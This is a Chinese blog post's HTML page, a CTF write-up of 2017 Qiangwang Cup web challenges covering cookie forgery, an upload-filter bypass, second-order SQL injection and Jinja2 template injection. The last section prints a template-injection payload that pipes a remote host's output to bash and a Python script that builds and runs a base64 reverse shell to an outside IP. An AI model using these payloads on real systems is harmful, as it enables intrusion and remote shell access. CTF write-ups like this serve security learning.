@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>[2017强网杯] Web Writeup | Pr0ph3t's blog</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-69613510-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+    <link rel="shortcut icon" href="/assets/images/favicon.png">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <h1 class="">Pr0ph3t</h1>
+    <p>
+    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"Pr0ph3t"</span>;
+    </p>
+    <p>
+    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
+    </p>
+    <p>
+    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
+    </p>
+    <!-- <p>
+            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
+        </p> -->
+    <p>
+    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
+    </p>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">home</a></li>
+          <li><a href="/blog/">blog</a></li>
+          <li><a href="/friendlink">friends</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>[2017强网杯] Web Writeup</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Sep 11, 2017
+        
+        
+        •
+        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <h2 id="web50">Web50 :</h2>
+
+<ul>
+<li>题目名称：Broken</li>
+<li>题目url：动态url</li>
+</ul>
+
+<p>首先一进去之后发现有file链接，点进去之后是一串JSFuck<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/1.png" alt="index"><br>
+然后丢去在线网站解密发现报错，应该是格式出错了<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/2.png" alt="解密报错"><br>
+这里我选择从解密网站的源码中抽出那段还没有eval的部分，单独执行一次，得出一段结果之后再拿去解密还是不行，这时丢进去Sublime格式化一下之后发现最下面缺少了一个 ]，补上之后直接eval，发现有一个数组<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/3.png" alt="数组"></p>
+
+<p>点开之后找到flag<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/4.png" alt="螢幕快照 2017-09-10 22.40.51.png"></p>
+
+<hr>
+
+<h2 id="web100">Web100：</h2>
+
+<ul>
+<li>题目名称：Who are you?</li>
+<li>题目链接：动态url</li>
+</ul>
+
+<p>进去之后有一句话 <code class="prettyprint">Sorry. You have no permissions.</code> 看Cookie后发现set了一个可疑cookie名字叫role，base64解密后是这个东西 <code class="prettyprint">f:5:&quot;thrfg&quot;;</code> 估计中间的字符串要变成相应的admin，脑洞大发直接将中间的rot13后就变成了guest，直接改成admin后再rot13再base64，然后修改cookie role成为这个之后进去另外一个页面，页面提示<code class="prettyprint">Hello admin, now you can upload something you are easy to forget.</code> 然后查看源码发现注释<code class="prettyprint">&lt;!-- $filename = $_POST[&#39;filename&#39;]; $data = $_POST[&#39;data&#39;]; --&gt;Hello admin, now you can upload something you are easy to forget.&lt;/body&gt;<br>
+</code><br>
+随便post一个filename为fuck.php，data是123的文件上去<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/5.png" alt="upload"></p>
+
+<p>发现后缀名是可以控制的，一开始的想法是在data里面写shell，但是发现过滤了左尖括号，很多姿势都没办法用，然后猜测后台使用了file_put_content这个函数，查看官方文档发现这个函数是可以接受数组的，尝试上传一个数组上去后绕过检测，打开上传之后的文件发现flag<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/6.png" alt="poc"></p>
+
+<hr>
+
+<h2 id="web200">Web200</h2>
+
+<ul>
+<li>题目名称：Phone Number</li>
+<li>题目链接：动态url</li>
+</ul>
+
+<p>进去之后发现是一个注册登录的界面，自然是首先想到的是注入，正常注册一个账号登录之后有这样的一个界面<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/7.png" alt="登录后"></p>
+
+<p>并且在点击check后注释中有这样一句话<code class="prettyprint">&lt;!-- 听说admin的电话藏着大秘密哦～--&amp;rt;</code><br>
+首先想到的是利用admin表长度限制的漏洞进行越权注册，发现没啥用。<br>
+然后想到的是二次注入，发现在用户名的地方是被addslash了无法注入，其次尝试phone，发现在注册的时候phone的长度作了限制，并且只能提交数字，这里使用了三个小技巧<br>
+1、phone的长度是前端做限制的，所以可以截包修改<br>
+2、sql是可以接收一段经过hex转换后的sql语句并执行的<br>
+3、在php中intval是把hex当作数字的</p>
+
+<p>这里很明确就是直接在注册的时候把注入语句转换成hex然后截包提交后登录点击check实现二次注入<br>
+exp：0x3120756e696f6e2073656c6563742070686f6e652066726f6d207573657223<br>
+直接上poc：</p>
+
+<p><img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/8.png" alt="poc"></p>
+
+<hr>
+
+<p>Web400：<br>
+- 题目名称：Musee de X<br>
+- 题目链接：动态url</p>
+
+<p>这是一个Django搭建的网站，Debug没有关，所以出错的时候能看到很多重要信息，包括关键代码和settings信息<br>
+进去之后是一个捐赠的网站，捐赠的是一个url链接，要图片，正常操作应该是将用户名做成水印写上去。尝试着输入一个非图片的链接，报错，看到关键代码是将图片重新绘制的，所以打消了上传马的念头。。。然后看到关键代码中有使用jinja2的模板<br>
+<img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/9.png" alt="99行处"><br>
+之前有一个cve是爆出jinja2有格式化字符串的漏洞，这个漏洞平时ctf比赛接触得比较少。。所以还是不太熟悉，找了好久。。。最后发现username是利用点，格式化字符串之后的结果会绘制在图片中。<br>
+注册一个名字为{{10+50}}的用户，正常进贡一张图片，发现</p>
+
+<p><img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/10.png" alt="用户名被计算"></p>
+
+<p>直接百度到exp(<a href="http://www.freebuf.com/articles/system/97146.html">http://www.freebuf.com/articles/system/97146.html)</a>)<br>
+然后发现太长的exp是不能注册的。。。带/的也不行，这里有几个骚操作：</p>
+
+<p>方法一：<br>
+最简单的方法是在自己的vps上开启http服务，将反弹shell的指令写入默认主页，也就是index.html或者是index.php</p>
+
+<p><img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/11.png" alt="index.php"></p>
+
+<p>然后注册exp为</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="s">'catch_warnings'</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">'linecache'</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'curl 139.199.206.219|bash'</span><span class="p">)</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</code></pre></div>
+<p>正常进贡图片，就能反弹到shell了</p>
+
+<p><img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/12.png" alt="反弹shell"></p>
+
+<p><img src="/assets/images/posts/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/13.png" alt="poc"></p>
+
+<p>方法二：<br>
+比较骚但是有点麻烦<br>
+这里因为长度的限制和/过滤的问题不能直接执行反弹shell的语句<br>
+这里我们直接将反弹shell语句base64一下之后一个个字写到一个文件<br>
+也就是 <code class="prettyprint">echo -n &#39;A&#39; &gt;&gt; 1</code><br>
+这里注意要加<code class="prettyprint">-n</code> 因为<code class="prettyprint">echo</code>默认是在最后面加入一个换行符<br>
+最后执行 <code class="prettyprint">cat 1 | base64 -d |bash</code>就行了<br>
+附上脚本：</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="c1">#csrfmiddlewaretoken
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMzkuMTk5LjIwNi4yMTkvODA4OCAwPiYxCg=='</span>
+<span class="n">reg_url</span> <span class="o">=</span> <span class="s">'http://db09b4708fa042e0a372daf2f1da7ba0aca963ed40124ae0.game.ichunqiu.com/register.php'</span>
+<span class="n">login_url</span> <span class="o">=</span> <span class="s">'http://db09b4708fa042e0a372daf2f1da7ba0aca963ed40124ae0.game.ichunqiu.com/login.php'</span>
+<span class="n">rce_url</span> <span class="o">=</span> <span class="s">'http://db09b4708fa042e0a372daf2f1da7ba0aca963ed40124ae0.game.ichunqiu.com/donate.php'</span>
+
+<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">getToken</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'name="csrfmiddlewaretoken" value="(.*?)"'</span><span class="p">,</span> <span class="n">content</span> <span class="p">,</span><span class="n">re</span><span class="o">.</span><span class="n">S</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">token</span> <span class="o">!=</span> <span class="p">[]:</span>
+        <span class="k">return</span> <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="s">'token not found'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">doReg</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">reg_url</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">reg_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="s">'123'</span><span class="p">,</span><span class="s">'csrfmiddlewaretoken'</span><span class="p">:</span><span class="n">token</span><span class="p">})</span>
+    <span class="n">doLogin</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">doLogin</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="s">'password'</span><span class="p">:</span><span class="s">'123'</span><span class="p">,</span> <span class="s">'csrfmiddlewaretoken'</span><span class="p">:</span><span class="n">token</span><span class="p">})</span>
+    <span class="k">if</span> <span class="s">'Head on over'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="n">rce</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="s">'login fail'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">rce</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">rce_url</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">rce_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'url'</span><span class="p">:</span><span class="s">'http://139.199.206.219/1.png'</span><span class="p">,</span> <span class="s">'text'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="s">'csrfmiddlewaretoken'</span><span class="p">:</span><span class="n">token</span><span class="p">,</span> <span class="s">'submit'</span><span class="p">:</span><span class="s">'Go!'</span><span class="p">})</span>
+    <span class="k">if</span> <span class="s">'/view/1'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="s">'upload fail'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="s">"{</span><span class="si">%% </span><span class="s">for c in [].__class__.__base__.__subclasses__() </span><span class="si">%%</span><span class="s">} {</span><span class="si">%% </span><span class="s">if c.__name__ == 'catch_warnings' </span><span class="si">%%</span><span class="s">} {{c.__init__.func_globals['linecache'].__dict__['os'].system('echo -n </span><span class="si">%</span><span class="s">s &gt;&gt; 1') }} {</span><span class="si">%% </span><span class="s">endif </span><span class="si">%%</span><span class="s">} {</span><span class="si">%% </span><span class="s">endfor </span><span class="si">%%</span><span class="s">}"</span> <span class="o">%</span> <span class="n">x</span>
+    <span class="k">print</span> <span class="n">username</span>
+    <span class="c1"># print username
+</span>    <span class="c1"># exit()
+</span>    <span class="k">try</span><span class="p">:</span>
+        <span class="n">doReg</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">e</span>
+        <span class="k">continue</span>
+<span class="k">print</span> <span class="s">'[*] Success!'</span>
+<span class="k">print</span> <span class="s">'[*] Using WebShell.......'</span>
+<span class="n">username</span> <span class="o">=</span> <span class="s">"{</span><span class="si">% </span><span class="s">for c in [].__class__.__base__.__subclasses__() </span><span class="si">%</span><span class="s">} {</span><span class="si">% </span><span class="s">if c.__name__ == 'catch_warnings' </span><span class="si">%</span><span class="s">} {{c.__init__.func_globals['linecache'].__dict__['os'].system('cat 1 | base64 -d|bash') }} {</span><span class="si">% </span><span class="s">endif </span><span class="si">%</span><span class="s">} {</span><span class="si">% </span><span class="s">endfor </span><span class="si">%</span><span class="s">}"</span>
+<span class="k">print</span> <span class="n">username</span>
+<span class="n">doReg</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+<span class="c1"># doLogin(username)
+</span><span class="k">print</span> <span class="s">'[*] Enjoy Your WebShell......'</span>
+</code></pre></div>
+  </article>
+
+	<p class="feed-recomendation">
+		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
+	</p>
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'pr0ph3t';
+    var disqus_config = function () {
+        this.page.identifier = "/blog/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/";
+    };
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      Thx!
+    </footer>
+  </div>
+</div>
+<script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function() {
+	$("img").each(function() {
+		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+		$(this).wrapAll(strA);
+    });
+});
+</script>
+<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->
+
+      </div>
+    </body>
+</html>
